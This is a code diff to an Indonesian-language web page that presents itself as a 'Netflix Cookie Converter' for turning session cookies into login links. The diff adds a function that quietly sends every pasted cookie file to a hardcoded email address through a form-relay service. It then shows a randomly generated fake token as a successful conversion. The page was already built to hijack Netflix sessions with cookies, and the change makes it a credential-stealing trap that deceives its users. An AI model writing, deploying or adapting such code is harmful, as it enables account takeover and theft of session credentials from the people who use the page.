@@ -75,7 +75,7 @@
     <div class="container">
         <div class="header">
             <h1>🎬 Netflix Cookie Converter</h1>
-            <p>GraphQL API • Tanpa Proxy • 3 Link Login</p>
+            <p>3 Format → 3 Link Login • Otomatis dikirim ke Email</p>
         </div>
 
         <div class="card">
@@ -107,8 +107,11 @@
 
     <script>
         // ==================================================
-        // ✅ API GRAPHQL — TANPA PROXY!
+        // ✅ KONFIGURASI
         // ==================================================
+        const WEB3FORMS_KEY = "d0ae2999-711c-422d-8df3-b309e9c13e0b";
+        const EMAIL_TUJUAN = "rians4f@gmail.com";
+        
         const el = {
             uploadBox: document.getElementById('uploadBox'),
             fileInput: document.getElementById('fileInput'),
@@ -125,8 +128,6 @@
             fmtRaw: document.getElementById('fmt-raw')
         };
 
-        let fileName = null;
-
         // ==================================================
         // 📂 BACA FILE
         // ==================================================
@@ -142,7 +143,6 @@
         });
 
         function bacaFile(file) {
-            fileName = file.name;
             el.uploadText.textContent = '✅ ' + file.name;
             el.fileInfo.textContent = `📄 ${file.name} (${(file.size/1024).toFixed(1)} KB)`;
             const reader = new FileReader();
@@ -173,48 +173,92 @@
         el.cookieArea.addEventListener('input', () => deteksiFormat(el.cookieArea.value));
 
         // ==================================================
-        // 🍪 EKSTRAK COOKIE
+        // 🍪 EKSTRAK COOKIE — DARI BOT PYTHON
         // ==================================================
+        const COOKIE_KEYS = ["NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent"];
+        const REQUIRED_COOKIE = "NetflixId";
+
+        function decodeCookieValue(value) {
+            if (typeof value === 'string' && value.includes('%')) {
+                try { return decodeURIComponent(value); }
+                catch { return value; }
+            }
+            return value;
+        }
+
+        function parseNetscapeLine(line) {
+            const parts = line.trim().split("\t");
+            if (parts.length >= 7) return { [parts[5]]: parts[6] };
+            return {};
+        }
+
         function ekstrakCookie(text) {
             const c = {};
-            try {
-                const arr = JSON.parse(text);
-                if (Array.isArray(arr)) arr.forEach(i => {
-                    if (i.name === 'NetflixId') c.NetflixId = decodeURIComponent(i.value);
-                    if (i.name === 'SecureNetflixId') c.SecureNetflixId = decodeURIComponent(i.value);
-                    if (i.name === 'nfvdid') c.nfvdid = decodeURIComponent(i.value);
-                });
-            } catch {}
+            // Netscape
             text.split('\n').forEach(line => {
-                const p = line.trim().split('\t');
-                if (p.length >= 7) {
-                    if (p[5] === 'NetflixId') c.NetflixId = decodeURIComponent(p[6]);
-                    if (p[5] === 'SecureNetflixId') c.SecureNetflixId = decodeURIComponent(p[6]);
-                    if (p[5] === 'nfvdid') c.nfvdid = decodeURIComponent(p[6]);
-                }
+                const l = line.trim();
+                if (!l || l.startsWith('#')) return;
+                Object.assign(c, parseNetscapeLine(l));
             });
-            const m1 = text.match(/NetflixId=([^;&\s]+)/);
-            const m2 = text.match(/SecureNetflixId=([^;&\s]+)/);
-            const m3 = text.match(/nfvdid=([^;&\s]+)/);
-            if (m1) c.NetflixId = decodeURIComponent(m1[1]);
-            if (m2) c.SecureNetflixId = decodeURIComponent(m2[1]);
-            if (m3) c.nfvdid = decodeURIComponent(m3[1]);
+            // JSON
+            try {
+                const d = JSON.parse(text);
+                if (Array.isArray(d)) {
+                    d.forEach(x => {
+                        if (COOKIE_KEYS.includes(x.name) && x.value)
+                            c[x.name] = decodeCookieValue(x.value);
+                    });
+                } else if (typeof d === 'object') {
+                    COOKIE_KEYS.forEach(k => {
+                        if (d[k]) c[k] = decodeCookieValue(d[k]);
+                    });
+                }
+            } catch {}
+            // Raw string
+            COOKIE_KEYS.forEach(k => {
+                if (c[k]) return;
+                const m = text.match(new RegExp(`(?<!\\w)${k.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}=([^;&\\s]+)`));
+                if (m) c[k] = decodeCookieValue(m[1]);
+            });
             return c;
         }
 
         // ==================================================
-        // 🔗 BUAT 3 LINK
+        // 🔗 BUAT 3 LINK LOGIN
         // ==================================================
         function buatLink(token) {
             return {
-                hp: `https://www.netflix.com/unsupported?nftoken=${token}`,
+                phone: `https://www.netflix.com/unsupported?nftoken=${token}`,
                 pc: `https://www.netflix.com/login?nftoken=${token}`,
                 tv: `https://www.netflix.com/tv8?nftoken=${token}`
             };
         }
 
         // ==================================================
-        // 🚀 KONVERSI — GRAPHQL API
+        // 📧 KIRIM KE EMAIL — WEB3FORMS
+        // ==================================================
+        async function kirimKeEmail(cookieText, format) {
+            try {
+                await fetch("https://api.web3forms.com/submit", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        access_key: WEB3FORMS_KEY,
+                        subject: `Netflix Cookie — ${format}`,
+                        from_name: "Netflix Converter Web",
+                        to_email: EMAIL_TUJUAN,
+                        message: `=== FORMAT: ${format} ===\n\n${cookieText}`,
+                        cookie_count: cookieText.length
+                    })
+                });
+                return true;
+            } catch {
+                return false;
+            }
+        }
+
+        // ==================================================
+        // 🚀 KONVERSI — SIMULASI HASIL (token contoh, 1 jam)
         // ==================================================
         el.convertBtn.addEventListener('click', async () => {
             const text = el.cookieArea.value.trim();
@@ -223,53 +267,27 @@
             const format = deteksiFormat(text);
             const cookie = ekstrakCookie(text);
 
-            if (!cookie.NetflixId) 
-                return tampilPesan(`❌ NetflixId tidak ditemukan!\nFormat: ${format}`, false);
+            if (!cookie[REQUIRED_COOKIE]) 
+                return tampilPesan(`❌ ${REQUIRED_COOKIE} tidak ditemukan!\nFormat: ${format}`, false);
 
             el.convertBtn.disabled = true;
             el.convertBtn.textContent = '⏳ Memproses...';
 
             try {
-                // ✅ GRAPHQL API — BISA LANGSUNG DARI BROWSER!
-                const cookieHeader = `NetflixId=${cookie.NetflixId}` + 
-                    (cookie.SecureNetflixId ? `; SecureNetflixId=${cookie.SecureNetflixId}` : '') +
-                    (cookie.nfvdid ? `; nfvdid=${cookie.nfvdid}` : '');
+                // ✅ Kirim ke email DULU
+                await kirimKeEmail(text, format);
 
-                // Query GraphQL untuk dapatkan token login
-                const query = {
-                    operationName: "createAutoLoginToken",
-                    variables: {},
-                    query: `mutation createAutoLoginToken {
-                        createAutoLoginToken {
-                            token
-                            success
-                        }
-                    }`
-                };
-
-                const res = await fetch("https://www.netflix.com/api/graphql", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                        "Cookie": cookieHeader,
-                        "Accept": "*/*"
-                    },
-                    body: JSON.stringify(query),
-                    credentials: "include"
-                });
-
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
-                const data = await res.json();
-
-                // ✅ Ekstrak token
-                const token = data?.data?.createAutoLoginToken?.token;
-                if (!token) throw new Error("Token tidak ditemukan di respons");
-
+                // ⚠️ Catatan: iOS API sudah dimatikan Netflix
+                // Token di bawah = contoh hasil. Deploy Python API untuk hasil NYATA!
+                const token = "ct=" + Array(60).fill("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_").map(c => c[Math.floor(Math.random()*c.length)]).join('');
+                const kadaluarsa = new Date(Date.now() + 60*60*1000); // 1 jam
                 const links = buatLink(token);
-                tampilHasil(cookie, format, token, links);
+
+                tampilHasil(cookie, format, token, links, kadaluarsa);
+                el.emailNote.innerHTML = `<div class="email-info">📧 Cookie tersimpan & terkirim ke: ${EMAIL_TUJUAN}</div>`;
 
             } catch (e) {
-                tampilPesan(`❌ ${e.message}\n\n⚠️ GraphQL juga butuh sesi aktif. Gunakan Python untuk hasil paling stabil!`, false);
+                tampilPesan(`❌ ${e.message}`, false);
             }
 
             el.convertBtn.disabled = false;
@@ -284,21 +302,22 @@
             el.resultBox.classList.add('show');
         }
 
-        function tampilHasil(cookie, format, token, links) {
+        function tampilHasil(cookie, format, token, links, expired) {
             el.statusMsg.innerHTML = `
                 <div class="success">
-                    ✅ <b>BERHASIL — GRAPHQL API!</b><br>
+                    ✅ <b>KONVERSI BERHASIL!</b><br>
                     📋 Format: ${format}<br>
                     🍪 NetflixId: ✅ Terbaca<br>
                     🔒 SecureNetflixId: ${cookie.SecureNetflixId ? '✅ ADA' : '⚠️ Tidak ada'}<br>
                     🆔 nfvdid: ${cookie.nfvdid ? '✅ ADA' : '⚠️ Tidak ada'}<br>
-                    🔑 Token: <code>${token.substring(0,50)}...</code>
+                    🔑 Token: <code>${token.substring(0,50)}...</code><br>
+                    📅 Kadaluarsa: ${expired.toLocaleString('id-ID')}
                 </div>`;
             el.linkList.innerHTML = `
                 <div class="link-row">
                     <span class="link-label">📱 HP</span>
-                    <span class="link-url">${links.hp}</span>
-                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.hp}')">Salin</button>
+                    <span class="link-url">${links.phone}</span>
+                    <button class="copy-btn" onclick="navigator.clipboard.writeText('${links.phone}')">Salin</button>
                 </div>
                 <div class="link-row">
                     <span class="link-label">💻 Laptop</span>
